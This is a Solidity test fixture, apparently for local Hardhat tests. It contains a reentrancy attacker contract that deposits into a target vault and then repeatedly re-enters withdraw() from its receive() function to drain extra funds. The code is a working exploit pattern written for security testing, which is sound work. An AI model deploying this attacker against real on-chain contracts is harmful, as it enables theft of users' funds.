// SPDX-License-Identifier: MIT
// TEST FIXTURE ONLY — Used exclusively inside local Hardhat tests.
pragma solidity 0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title ReentrancyAttackerFixture
 * @notice Local test harness contract to verify reentrancy exploitability on fixtures.
 */
contract ReentrancyAttackerFixture {
    IVault public immutable target;
    uint256 public attackChunk;
    uint256 public reentryCount;
    uint256 public maxReentries = 3;

    constructor(address _target) {
        target = IVault(_target);
    }

    function attack() external payable {
        require(msg.value > 0, "Need seed");
        attackChunk = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    receive() external payable {
        if (reentryCount < maxReentries && address(target).balance >= attackChunk) {
            reentryCount++;
            target.withdraw(attackChunk);
        }
    }
}

